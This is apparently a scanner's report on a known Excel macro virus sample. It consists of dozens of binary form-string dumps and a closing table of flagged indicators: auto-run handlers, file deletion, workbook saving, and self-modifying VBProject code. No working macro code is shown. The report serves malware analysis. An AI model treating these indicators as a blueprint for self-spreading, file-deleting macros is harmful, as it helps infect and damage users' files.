- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�M�@�r2��KE�T�D
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tw-옃F�s�Q���F�%@8Y�!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�`^ڍȈ����	^
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
05s@N���3
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�.୧Lt�b�GP�!͗��X�&ñ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%��X/,��ǹ��qqT�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
^�y��G3�P+S
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�\�Y�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�_�E�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�1`P��TeX
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Pp�.��$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��1��Ű�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+'�R�`��ڈ#�c���4V
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��p���|��s��É^Voz��$�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ҵ�ʒ4�g�(��bdp��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B�fPX!��̵
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�d?�K5��(�z�"�0��6	I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
`=�/�o
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@+L#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���K�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Xc�O�w��={�$͛
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���d7I�5ha�G2
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�*�^`W
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
/�!�̬H(��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��LM��{�Z�A�J
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
y�FC�,�^*\
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�X'DJ�!S
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ۉ-�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�g)���u
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
m�E�n(�C.�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�2�a���KՔ[�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ic+b*%qw
�! �l>�9*�ۢ"���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)�2��eX��7�( $.��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ů�)�^�@���E�Gy�mEl�r�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���
%�_�H�l�,D*5�hu
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��K��4d��H���fh�[�8
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���4�F�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
e�;�-�a��}�<d���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
M@��j�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BStJ �W�R����&A2�X��N!����a�T�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����3
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����3R
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ğz�)��T
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�KYYb���]̻�q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�T�ӇXT�1
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�K������3
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��:�5
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��[��E%�`�E���[���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
۸��aQ$r
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
셱,a�Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�(��.X
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%�1[9i�������b�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
̋�nSm 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�9"T���`

��f�ן
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+���.O>�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
A��T��p�V�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�߹����|F��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�g!��L���
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Image1'" IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Workbook_BeforeClose|Runs when the Excel Workbook is closed       |
|AutoExec  |CommandButton1_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|ActiveWorkbook.SaveA|May save the current workbook                |
|          |s                   |                                             |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Hex String|33333333333333333333|333333333333333333333333333333333333333333333|
|          |33333               |33333                                        |
+----------+--------------------+---------------------------------------------+

